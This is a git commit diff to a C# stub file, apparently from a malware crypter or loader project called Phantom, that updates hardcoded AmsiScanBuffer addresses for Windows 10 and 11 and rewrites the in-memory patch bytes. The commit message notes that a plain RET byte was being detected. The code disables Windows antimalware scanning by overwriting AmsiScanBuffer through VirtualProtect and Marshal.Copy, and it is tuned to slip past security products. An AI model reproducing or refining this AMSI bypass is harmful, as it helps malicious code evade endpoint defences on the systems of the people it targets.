f253c87ecc2b6b397b84a67270352e12e011f43c
Knakiri <95192545+Knakiri@users.noreply.github.com>
2025-01-12 00:30:17 +0100

    Update BStub.cs
    Update x64 windows addresses
    Update Patch byte for x64
    
    i dont have x86 & win10 and was lazy about it.

--- Phantom/Resources/BStub.cs
+++ Phantom/Resources/BStub.cs
@@ -20,8 +20,8 @@ namespace PHANTOM
         }
 
 #if x64
-        private static IntPtr amsiScanBufferAddress_Win11 = (IntPtr)0x180008260; //May change in the future!
-        private static IntPtr amsiScanBufferAddress_Win10 = (IntPtr)0x180003860; //May change in the future!
+        private static IntPtr amsiScanBufferAddress_Win11 = (IntPtr)0x1800081A0; //May change in the future!
+        private static IntPtr amsiScanBufferAddress_Win10 = (IntPtr)0x180003880; //May change in the future!
         private static IntPtr RebaseAddress = (IntPtr)0x180000000;
 #else
         private static IntPtr amsiScanBufferAddress_Win11 = (IntPtr)0x10005D60; //May change in the future!
@@ -45,7 +45,7 @@ namespace PHANTOM
             {
                 Address = ASLR(amsiScanBufferAddress_Win10, RebaseAddress, obfDll_Str);
             }
-            byte[] Patch = (IntPtr.Size == 8) ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+            byte[] Patch = (IntPtr.Size == 8) ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80,0x48, 0x8B, 0x04, 0x24,0x48, 0x83, 0xC4, 0x08,0xFF, 0xE0 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }; //0xC3 = RET is being flagged and cant be written so we needed update the patch byte.
             uint oldProtect;
             VirtualProtect(Address, (UIntPtr)Patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
             Marshal.Copy(Patch, 0, Address, Patch.Length);
